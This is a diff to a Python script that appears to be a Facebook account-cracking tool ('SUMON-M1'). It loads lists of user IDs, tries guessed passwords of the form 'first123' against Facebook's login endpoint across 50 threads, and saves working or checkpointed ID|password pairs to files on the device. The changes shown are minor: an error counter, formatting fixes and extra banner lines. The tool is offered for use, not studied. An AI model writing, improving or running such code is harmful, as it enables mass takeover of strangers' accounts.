@@ -13,7 +13,7 @@ cps = []
 loop = 0
 idz = []
 plist = []
-
+error_msg = []
 def clear():
     os.system('clear' if os.name == 'posix' else 'cls')
 
@@ -41,9 +41,9 @@ def banner():
     linex()
 
 def freefb(uid, name, pwx, tl):
-    global loop, oks, cps
+    global loop, oks, cps, error_msg
     
-    sys.stdout.write(f"\r\033[1;37m [SUMON-M1] [{loop}] [OK:{len(oks)}] [CP:{len(cps)}]\r")
+    sys.stdout.write(f"\r\033[1;37m [SUMON-M1] [{loop}] [OK:{len(oks)}] [CP:{len(cps)}] [error_msg:{len(error_msg)}]\r")
     sys.stdout.flush()
     
     try:
@@ -143,29 +143,29 @@ def freefb(uid, name, pwx, tl):
                 q = response.json()
                         
                 if 'access_token' in q:
-                            print(f"\n\033[1;32m✅ [OK] {uid} | {pw}\033[1;37m")
-                            oks.append(uid)
+                  print(f"\n\033[1;32m✅ [OK] {uid} | {pw}\033[1;37m")
+                  oks.append(uid)
                             
-                            # Save to file
-                            with open('/sdcard/SUMON-M1-OK.txt', 'a') as f:
-                                f.write(f'{uid}|{pw}\n')
-                            break
+                  # Save to file
+                  with open('/sdcard/SUMON-M1-OK.txt', 'a') as f:
+                     f.write(f'{uid}|{pw}\n')
+                  break
                             
                 elif 'error' in q:
-                            error_msg = q['error'].get('message', '')
-                            print(f"\n\033[1;33m⚠️ [error_msg] {error_msg}")
-                            if 'www.facebook.com' in error_msg:
-                                print(f"\n\033[1;33m⚠️ [CP] {uid} | {pw}\033[1;37m")
-                                cps.append(uid)
-                                with open('/sdcard/SUMON-CP.txt', 'a') as f:
-                                    f.write(f'{uid}|{pw}\n')
-                                break
-                            elif 'invalid' in error_msg.lower():
-                                continue
-                            else:
-                                continue
+                  error_msg = q['error'].get('message', '')
+                  #print(f"\n\033[1;33m⚠️ [error_msg] {error_msg}")
+                  if 'www.facebook.com' in error_msg:
+                      print(f"\n\033[1;33m⚠️ [CP] {uid} | {pw}\033[1;37m")
+                      cps.append(uid)
+                      with open('/sdcard/SUMON-CP.txt', 'a') as f:
+                        f.write(f'{uid}|{pw}\n')
+                      break
+                  elif 'invalid' in error_msg.lower():
+                     continue
+                  else:
+                     continue
                 else:
-                            continue
+                   continue
                 
                     
             except requests.exceptions.RequestException as e:
@@ -180,6 +180,8 @@ def freefb(uid, name, pwx, tl):
 
 def f_clone():
     clear()
+    linex()
+    linex()
     print("\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/file.txt ")
     linex()
     file_x = input("\033[1;32m[\033[1;31m✓\033[1;32m] Enter FILE PATH : ")
@@ -192,10 +194,14 @@ def f_clone():
         idz.append(x)
     
     clear()
+    linex()
+    linex()
     print(f"\033[1;32m [1] METHOD 1 ")
     linex()
     m = input(f"\033[1;32m [-] SELECT : ")
     clear()
+    linex()
+    linex()
     print(f"\033[1;32m [1] CRACK WITH AUTO PASS ")
     print(f"\033[1;32m [2] CRACK WITH MANUAL PASS ")
     linex()
@@ -211,10 +217,14 @@ def f_clone():
         plist.append("first@12")
     else:
         clear()
+        linex()
+        linex()
         print("\033[1;32m[\033[1;31m✓\033[1;32m] MAXIMUM LIMIT : (10) ")
         linex()
         plimit = int(input("\033[1;32m[\033[1;31m✓\033[1;32m] ENTER PASSWORD LIMIT : "))
         clear()
+        linex()
+        linex()
         print("\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : first123, first1234, first12345 ")
         linex()
         for SUMON in range(plimit):
@@ -223,6 +233,8 @@ def f_clone():
     
     with ThreadPool(max_workers=50) as SUMON_xd:
         clear()
+        linex()
+        linex()
         tl = str(len(idz))
         print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ACCOUNTS : "+tl)
         print("\033[1;32m[\033[1;31m✓\033[1;32m] PROCESS HAS BEEN STARTED ")
